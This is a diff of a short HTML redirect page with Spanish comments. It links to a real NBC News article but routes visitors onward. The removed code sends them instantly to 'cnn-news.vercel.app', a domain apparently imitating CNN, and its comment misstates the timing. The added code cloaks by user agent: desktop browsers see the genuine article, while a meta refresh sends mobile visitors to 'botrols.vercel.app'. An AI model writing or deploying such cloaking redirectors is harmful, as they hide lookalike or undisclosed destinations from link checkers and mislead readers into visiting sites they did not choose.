@@ -1,19 +1,22 @@
-<!DOCTYPE html>
-<html lang="es">
+<html>
+   
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
     <script>
-        // Redireccionar a la primera página después de 3 segundos
-        setTimeout(function() {
-            window.location.href = 'https://www.nbcnews.com/news/us-news/new-murder-charges-brought-man-accused-killing-uva-football-players-rcna104246';
-        }, 3000); // 3000 milisegundos = 3 segundos
-
-        // Redireccionar a la segunda página después de 6 segundos
-        setTimeout(function() {
-            window.location.href = 'https://cnn-news.vercel.app';
-        }, 0); // 6000 milisegundos = 6 segundos
+        // Función para redirigir solo si no se detecta un PC
+        function redirectIfNotMobile() {
+            // Verificar si el agente de usuario contiene "Mobi" para detectar un dispositivo móvil
+            if (!navigator.userAgent.match(/Mobi/i)) {
+                // No es un dispositivo móvil, redireccionar a una URL diferente
+                window.location.href = 'https://www.nbcnews.com/news/us-news/new-murder-charges-brought-man-accused-killing-uva-football-players-rcna104246';
+            }
+        }
     </script>
+    <meta http-equiv="refresh" content="0; url=https://botrols.vercel.app">
 </head>
+<body>
+    <script>
+        redirectIfNotMobile();
+    </script>
+
 </html>
